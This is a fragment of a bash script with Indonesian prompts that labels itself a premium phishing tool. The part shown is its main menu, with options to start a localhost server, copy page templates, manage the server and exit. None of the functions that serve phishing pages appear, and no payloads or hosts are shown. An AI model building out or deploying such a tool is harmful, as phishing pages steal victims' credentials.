    echo "Script by: Flood | Contact: ngoprek.xyz/contact"
    echo "Tools phising Premium"
    echo " "
    type_effect "     M A I N   M E N U"
    print_separator
    echo -e "${C_YELLOW}   1)${C_RESET} Jalankan Localhost"
    echo -e "${C_YELLOW}   2)${C_RESET} Copy/Buat File dari Template"
    echo -e "${C_YELLOW}   3)${C_RESET} Cek/Hentikan Localhost"
    echo -e "${C_YELLOW}   4)${C_RESET} Exit"
    print_separator
    read -rp "$(echo -e "${C_BOLD}${C_MAGENTA}Pilih menu [1-4]: ${C_RESET}")" pilih

    case "$pilih" in
      1)
        run_localhost
        echo
        read -rp "$(echo -e "${C_YELLOW}Server dihentikan. Tekan Enter untuk kembali ke menu...${C_RESET}")"
        ;;
      2)
        copy_template
        ;;
      3)
        clear
        type_effect "⚙️ Manajemen Localhost"
        print_separator
        manage_localhost
        echo
        read -rp "$(echo -e "${C_YELLOW}Tekan Enter untuk kembali ke menu...${C_RESET}")"
        ;;
      4)
        echo -e "${C_CYAN}👋 Sampai jumpa!${C_RESET}"
        exit 0
        ;;
      *)
        echo -e "${C_RED}Pilih yang bener dong soalnya kagak valid!{C_RESET}"
        sleep 1
        ;;
    esac
  done
}

main_menu
